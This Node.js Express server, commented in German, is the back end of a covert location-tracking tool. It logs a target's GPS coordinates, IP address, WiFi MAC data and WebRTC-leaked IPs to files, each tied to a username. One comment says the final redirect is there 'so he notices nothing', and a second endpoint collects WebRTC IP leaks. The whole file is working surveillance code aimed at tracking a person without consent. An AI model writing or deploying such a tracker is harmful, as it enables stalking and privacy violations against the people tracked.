const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Erweitertes Logging für ALLE Tracking-Methoden
app.post('/submit', async (req, res) => {
  try {
    const { 
      username, 
      method,  // "gps", "ip", "wifi", "webrtc"
      latitude, 
      longitude, 
      extra    // WLAN-Daten, Genauigkeit, etc.
    } = req.body;

    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const logData = {
      timestamp: new Date().toISOString(),
      ip: clientIp,
      userAgent: req.headers['user-agent'],
      username,
      method,       // Welche Tracking-Methode?
      latitude,     // Kann null sein (bei WLAN/IP)
      longitude,    // Kann null sein (bei WLAN/IP)
      extraData: extra // WLAN-MACs, WebRTC-IP, etc.
    };

    // Speichere alles in einer JSON-Datei (einfacher zu analysieren)
    fs.appendFile('tracking.log', JSON.stringify(logData) + '\n', (err) => {
      if (err) console.error("❌ Log-Fehler:", err);
    });

    // Console-Log für Echtzeit-Überwachung
    console.log("🕵️‍♂️ NEUE DATEN GESAMMELT:");
    console.log("👤 Nutzer:", username || "N/A");
    console.log("📡 Methode:", method || "N/A");
    console.log("📍 Koordinaten:", latitude + ", " + longitude || "N/A");
    console.log("🌐 IP:", clientIp);
    console.log("📶 WLAN/Extra:", extra || "N/A");

    // Umleitung (damit er nichts merkt)
    res.redirect('/success.html'); 

  } catch (error) {
    console.error("❌ KRITISCHER FEHLER:", error);
    res.status(500).send("Serverfehler");
  }
});

// Neuer Endpoint für WebRTC-IP-Leaks
app.post('/submit-ip', (req, res) => {
  const { leakIp } = req.body;
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  fs.appendFile('webrtc-leaks.log', 
    `[${new Date().toISOString()}] IP: ${clientIp} → WebRTC-IP: ${leakIp}\n`,
    (err) => { if (err) console.error("❌ WebRTC-Log-Fehler:", err); }
  );

  console.log("🔦 WebRTC-IP-Leak:", leakIp);
  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
});
